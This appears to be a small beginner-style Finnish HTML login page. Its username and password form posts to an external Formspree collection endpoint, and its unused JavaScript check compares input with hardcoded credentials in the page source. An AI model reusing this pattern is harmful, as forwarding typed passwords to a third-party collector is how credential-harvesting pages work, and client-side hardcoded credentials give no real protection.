<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Kirjautuminen</title>
</head>
<body>

  <h2>Tervetuloa! Kirjaudu sisään</h2>

  <!-- LOMAKE -->
  <form action="https://formspree.io/f/mjkwdlgk" method="POST">
  <label for="kayttaja">Käyttäjätunnus:</label><br>
  <input type="text" id="kayttaja" name="kayttaja" required><br><br>

  <label for="salasana">Salasana:</label><br>
  <input type="password" id="salasana" name="salasana" required><br><br>

  <input type="submit" value="Kirjaudu">
</form>

  <!-- VIRHEVIESTI -->
  <p id="virheteksti" style="color: red;"></p>

  <!-- JAVASCRIPT -->
  <script>
    function tarkistaKirjautuminen() {
      const kayttaja = document.getElementById('kayttaja').value;
      const salasana = document.getElementById('salasana').value;

      if (kayttaja === "pelaaja" && salasana === "1234") {
        alert("Kirjautuminen onnistui!");
        return true;
      } else {
        document.getElementById('virheteksti').innerText = "Virheellinen käyttäjätunnus tai salasana.";
        return false;
      }
    }
  </script>

</body>
</html>
